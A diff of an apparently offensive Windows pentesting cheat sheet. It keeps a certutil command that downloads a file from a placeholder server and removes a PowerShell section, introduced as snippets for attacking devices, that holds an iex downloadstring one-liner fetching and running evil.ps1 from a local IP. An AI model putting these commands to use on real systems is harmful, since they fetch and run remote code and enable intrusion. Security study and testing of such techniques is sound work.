@@ -16,22 +16,6 @@
 certutil.exe -urlcache -split -f https://myserver/filename outputfilename
 ```
 
-## Powershell
-
-Powershell was Windows' answer to improving the scripting solution within Windows.  It's incredibly powerful for both Sysadmins as well as attackers.  Here I will include a number of snippets I've found useful for attacking devices with.
-
-#### Executing a script without an extension
-
-```text
-powershell - < ps1file
-```
-
-#### Executing a script hosted on a web-server
-
-```text
-iex (new-object net.webclient).downloadstring('http://192.168.0.1/evil.ps1')
-```
-
 ## Applocker
 
 > AppLocker advances the app control features and functionality of Software Restriction Policies. AppLocker contains new capabilities and extensions that allow you to create rules to allow or deny apps from running based on unique identities of files and to specify which users or groups can run those apps.
